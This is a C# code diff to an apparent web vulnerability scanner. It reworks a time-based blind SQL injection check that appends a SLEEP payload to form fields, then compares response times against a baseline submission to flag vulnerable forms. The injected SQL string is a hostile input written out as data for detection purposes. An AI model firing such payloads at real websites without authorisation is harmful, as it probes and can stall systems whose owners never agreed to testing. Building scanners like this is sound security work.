@@ -2,6 +2,7 @@
 using System;
 using System.Collections.Generic;
 using System.Linq;
+using System.Net.Http;
 using System.Text;
 using System.Threading.Tasks;
 
@@ -28,16 +29,12 @@ namespace iInjectProviders {
 				var OldValue = Control.Value;
 				var NewValue = Control.GenerateDefaultValue(true);
 				try {
-					Control.Value = NewValue + "' OR SLEEP(30000) = '1";
-					DateTime StartTime = DateTime.Now;
-					var SubmitTask = Form.SubmitAsync(Parser);
-					PageResponse Response = null;
-					try {
-						Response = await SubmitTask;
-					} catch(Exception) { } // If an exception, do nothing as we can expect a timeout.
-					// TODO: Check to make sure regular call doesn't take this long.
-					DateTime StopTime = DateTime.Now;
-					if((StopTime - StartTime).TotalSeconds > 15) {
+					TimeSpan Timeout = TimeSpan.FromSeconds(30);
+					Control.Value = NewValue + "' OR SLEEP(" + Timeout.TotalMilliseconds + ") = '1";
+					TimeSpan LongElapsed = await TimeResponse(Form, Timeout);
+					Control.Value = Control.GenerateDefaultValue(false);
+					TimeSpan ShortElapsed = await TimeResponse(Form, Timeout);
+					if(LongElapsed >= Timeout && ShortElapsed.Ticks < (Timeout.Ticks / 3)) {
 						Results.Add(new VulnerabilityDetails(Form, Control, this));
 					}
 				} finally {
@@ -47,8 +44,17 @@ namespace iInjectProviders {
 			return Results;
 		}
 
+		private async Task<TimeSpan> TimeResponse(WebForm Form, TimeSpan Timeout) {
+			DateTime StartDate = DateTime.Now;
+			try {
+				PageResponse Response = await Form.SubmitAsync(Session.Crawler.Parser, Timeout);
+			} catch { }
+			DateTime EndDate = DateTime.Now;
+			return (EndDate - StartDate);
+		}
+
 		public string Name {
-			get { return "Sql Injection Sleep Scaner"; }
+			get { return "Sleep Scaner"; }
 		}
 	}
 }
